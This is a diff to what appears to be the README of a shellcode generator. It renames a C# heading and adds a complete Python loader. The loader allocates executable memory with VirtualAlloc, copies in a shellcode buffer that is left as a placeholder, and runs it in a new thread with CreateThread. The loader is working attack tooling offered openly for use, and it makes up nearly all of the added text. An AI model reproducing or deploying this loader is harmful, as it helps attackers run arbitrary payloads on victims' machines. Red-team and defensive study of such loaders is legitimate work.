@@ -25,7 +25,7 @@ Users can choose to execute generated shellcode in this Python script, generated
 
 ```
 
-#### Csharp
+#### CSharp
 ```csharp
 
 ```
@@ -79,7 +79,32 @@ $hThread =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointe
 
 #### Python
 ```python
+import ctypes, struct
 
+
+buf =  b"\x48\x31\...."  # SHELLCODE HERE
+buf=bytearray(buf)
+
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(buf)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+buf = (ctypes.c_char * len(buf)).from_buffer(buf)
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
+                                     buf,
+                                     ctypes.c_int(len(buf)))
+print("Shellcode located at address %s" % hex(ptr))
+
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.c_uint64(ptr),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.pointer(ctypes.c_int(0)))
+
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 ```
 
 ## Known Issues
